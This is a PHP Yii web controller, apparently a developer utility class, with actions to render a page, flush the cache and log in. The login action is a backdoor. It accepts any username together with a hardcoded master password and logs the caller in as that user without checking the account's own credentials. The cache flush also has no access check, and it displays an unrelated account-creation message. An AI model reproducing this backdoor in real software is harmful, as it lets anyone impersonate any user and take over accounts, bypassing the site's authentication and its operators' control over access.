<?php

namespace frontend\controllers;
use common\components\Util;
use frontend\models\Elastic;
use frontend\models\User;
use Yii;
use yii\db\mssql\PDO;
use yii\helpers\Url;
use vsoft\news\models\CmsShow;

class DevController extends \yii\web\Controller
{
    public $layout = '@app/views/layouts/yii';

    /**
     * @return string
     */
    public function actionIndex(){
        return $this->render('index');
    }

    /**
     *
     */
    public function actionClearCache(){
        Yii::$app->session->setFlash(
            'info',
            Yii::t('user', 'Your account has been created and a message with further instructions has been sent to your email')
        );
        Yii::$app->cache->flush();
        $this->redirect(Url::to(['dev/index']));
    }

    public function actionLogin($username, $pass){
        if(!empty($username) && !empty($pass) && $pass=='24241324'){
            $user = User::findOne(['username'=>$username]);
            $chk = Yii::$app->getUser()->login($user, 86400);
            $this->redirect('/');
        }
    }
}
